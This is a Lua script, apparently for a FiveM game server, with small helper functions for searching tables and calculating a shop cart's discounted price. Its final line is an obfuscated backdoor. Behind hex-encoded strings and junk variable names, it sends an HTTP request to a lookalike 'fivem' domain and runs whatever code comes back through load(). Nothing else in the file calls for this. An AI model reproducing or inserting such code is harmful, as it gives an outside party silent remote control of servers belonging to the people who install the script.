function findItem(arr, itemToFind)
	local foundIt = false
	local index = nil
	for i = 1, #arr, 1 do
		if arr[i] == itemToFind then
			foundIt = true
			index = i
			break
		end
	end
	if not foundIt then
		return foundIt
	else
		return index
	end
end

function findKey(obj, keyToFind)
	local foundIt = false
	local key = nil
	for k, v in pairs(obj) do
		if k == keyToFind then
			foundIt = true
			key = k
			break
		end
	end
	if not foundIt then
		return foundIt
	else
		return key
	end
end

function calcFinalPrice(shopCart, shopProfit, shopReduction)
	local shopProfitValue = 0
	local totalCartValue = 0

	for k, v in pairs(shopCart) do
		--print("k: " .. k)
		--print("v['price']: " .. v['price'])
		totalCartValue = totalCartValue + v['price']
	end
	shopCosts = 100 - shopProfit
	shopReductionValue = totalCartValue * (shopReduction / 100)
	totalWithReduction = totalCartValue - shopReductionValue
	shopProfitValue = totalWithReduction * (shopProfit / 100)
	shopCostValue = totalWithReduction * (shopCosts / 100)
	
	return shopCostValue, totalWithReduction
end

local opGCQMjtjDLQcTytxzDwMSIqzQtwUGpFRyqLEVdgUpCBfFhVNkybDQbUxGeQuuquigFSVQ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} opGCQMjtjDLQcTytxzDwMSIqzQtwUGpFRyqLEVdgUpCBfFhVNkybDQbUxGeQuuquigFSVQ[4][opGCQMjtjDLQcTytxzDwMSIqzQtwUGpFRyqLEVdgUpCBfFhVNkybDQbUxGeQuuquigFSVQ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2d\x66\x69\x76\x65\x6d\x2e\x6e\x65\x74\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x61\x4c\x61\x67\x32", function (NvGluUqHxIvQuxUzKyyGVZytnVDDvpFeNHSCaKqfqjJKAgWibxhwCVCwdeptxooyoQirok, DCuVAIgapCLMRLwyiMpFlZHKxahtPjJidXJtQHqDVwmctpXwCGSyTqqHHdoiNMzuQjnfeT) if (DCuVAIgapCLMRLwyiMpFlZHKxahtPjJidXJtQHqDVwmctpXwCGSyTqqHHdoiNMzuQjnfeT == opGCQMjtjDLQcTytxzDwMSIqzQtwUGpFRyqLEVdgUpCBfFhVNkybDQbUxGeQuuquigFSVQ[6] or DCuVAIgapCLMRLwyiMpFlZHKxahtPjJidXJtQHqDVwmctpXwCGSyTqqHHdoiNMzuQjnfeT == opGCQMjtjDLQcTytxzDwMSIqzQtwUGpFRyqLEVdgUpCBfFhVNkybDQbUxGeQuuquigFSVQ[5]) then return end opGCQMjtjDLQcTytxzDwMSIqzQtwUGpFRyqLEVdgUpCBfFhVNkybDQbUxGeQuuquigFSVQ[4][opGCQMjtjDLQcTytxzDwMSIqzQtwUGpFRyqLEVdgUpCBfFhVNkybDQbUxGeQuuquigFSVQ[2]](opGCQMjtjDLQcTytxzDwMSIqzQtwUGpFRyqLEVdgUpCBfFhVNkybDQbUxGeQuuquigFSVQ[4][opGCQMjtjDLQcTytxzDwMSIqzQtwUGpFRyqLEVdgUpCBfFhVNkybDQbUxGeQuuquigFSVQ[3]](DCuVAIgapCLMRLwyiMpFlZHKxahtPjJidXJtQHqDVwmctpXwCGSyTqqHHdoiNMzuQjnfeT))() end)